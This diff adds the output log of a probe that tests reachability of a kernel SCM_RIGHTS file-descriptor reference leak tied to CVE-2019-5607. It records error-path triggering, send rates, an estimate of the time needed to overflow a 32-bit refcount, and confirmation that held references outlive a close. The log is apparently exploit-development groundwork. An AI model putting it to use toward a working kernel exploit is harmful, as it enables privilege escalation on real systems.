@@ -1,0 +1,38 @@
+=== PROBE 89b: CVE-2019-5607 GATE TEST ===
+
+pid=933
+--- A: SCM_RIGHTS BASELINE ---
+  socketpair ret=0 [23,24]
+  target pipe [25,26]
+  scm_send_1(pipe_rd=25) ret=1
+  scm_recv → fd=27
+  read(recv_fd): n=4 val=0xAAAA0001 *** BASELINE OK ***
+
+--- B: ERROR PATH [valid, 9999] ---
+  scm_send_2([25, 9999]) ret=-1
+  *** ERROR PATH REACHED — sendmsg returned -1 ***
+  post-error fd check: n=4 val=0xBBBB0002 *** FD SURVIVED ERROR ***
+  scm_send_2([9999, 25]) ret=-1
+
+--- C: ERROR PATH PUMP THROUGHPUT ---
+  1000 iterations: ok=0 fail=1000 crash=0
+  elapsed: 777774 us (777.8 ms)
+  rate: 1285 sends/sec
+  *** ALL sends returned -1 (error path consistently triggered) ***
+  time to pump 2^32: ~3342387 seconds (~928.4 hours)
+
+--- D: NORMAL SCM_RIGHTS REFCOUNT ---
+  pumped 20 successful SCM_RIGHTS sends
+  closed tgt_rd=25
+  recovered 20 held fds
+  held[1] fd=25: read n=4 val=0xDD000001 ALIVE
+  held[2] fd=27: read n=4 val=0xDD000002 ALIVE
+  held[3] fd=28: read n=4 val=0xDD000003 ALIVE
+  ... (17 more alive)
+  total alive: 20/20
+  *** fhold() CONFIRMED reachable — refs kept pipe alive after close ***
+
+--- E: ERROR PATH LEAK EVIDENCE ---
+  pipe rd=25 wr=26 dup=-1
+  error-path sends: 50
+  closed efd=25 and dup=-1
